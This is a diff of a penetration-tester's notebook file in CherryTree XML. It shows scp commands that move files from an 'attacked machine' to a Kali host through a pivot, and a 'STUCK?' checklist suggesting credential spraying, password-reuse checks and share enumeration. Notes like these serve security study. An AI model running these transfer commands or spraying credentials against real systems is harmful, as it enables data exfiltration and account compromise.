@@ -1189,13 +1189,14 @@ Then we can transfer the files from the attacked machine:
         <codebox char_offset="248" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to accespt the key
 echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual transfer</codebox>
       </node>
-      <node name="STUCK?" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1690137934" ts_lastsave="1690705730">
-        <rich_text>-  Try </rich_text>
+      <node name="STUCK?" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1690137934" ts_lastsave="1694629686">
+        <rich_text>- Try </rich_text>
         <rich_text weight="heavy">spraying the credentials</rich_text>
         <rich_text>, maybe a password is reused by another user (but </rich_text>
         <rich_text weight="heavy">watch out for account lockouts</rich_text>
         <rich_text>)
-- Check for password reusal</rich_text>
+- Check for password reusal
+- Check shares</rich_text>
       </node>
       <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693404762">
         <rich_text>If we find that we have </rich_text>
